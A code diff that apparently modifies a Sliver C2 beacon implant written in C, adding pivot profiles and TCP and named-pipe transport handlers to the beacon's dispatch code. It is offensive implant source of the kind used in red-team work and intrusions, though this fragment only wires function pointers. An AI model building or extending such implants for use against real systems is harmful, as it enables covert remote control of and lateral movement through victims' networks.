@@ -399,6 +399,10 @@ VOID BeaconMainLoop
 		ProfileList = pConfig->DriveProfiles;
 		cProfiles = pConfig->cDriveProfiles;
 	}
+	else if (pConfig->Type == Pivot) {
+		ProfileList = pConfig->PivotProfiles;
+		cProfiles = pConfig->cPivotProfiles;
+	}
 	else {
 		goto CLEANUP;
 	}
@@ -506,6 +510,22 @@ PSLIVER_BEACON_CLIENT BeaconInit
 		pBeacon->Receive = HttpRecv;
 		pBeacon->Close = HttpClose;
 		pBeacon->Cleanup = FreeHttpClient;
+	}
+	else if (pGlobalConfig->Protocol == Tcp) {
+		pBeacon->Init = (CLIENT_INIT)TcpInit;
+		pBeacon->Start = TcpStart;
+		pBeacon->Send = TcpSend;
+		pBeacon->Receive = TcpRecv;
+		pBeacon->Close = TcpClose;
+		pBeacon->Cleanup = TcpCleanup;
+	}
+	else if (pGlobalConfig->Protocol == NamedPipe) {
+		pBeacon->Init = (CLIENT_INIT)PipeInit;
+		pBeacon->Start = PipeStart;
+		pBeacon->Send = PipeSend;
+		pBeacon->Receive = PipeRecv;
+		pBeacon->Close = PipeClose;
+		pBeacon->Cleanup = PipeCleanup;
 	}
 	else {
 		FREE(pBeacon);
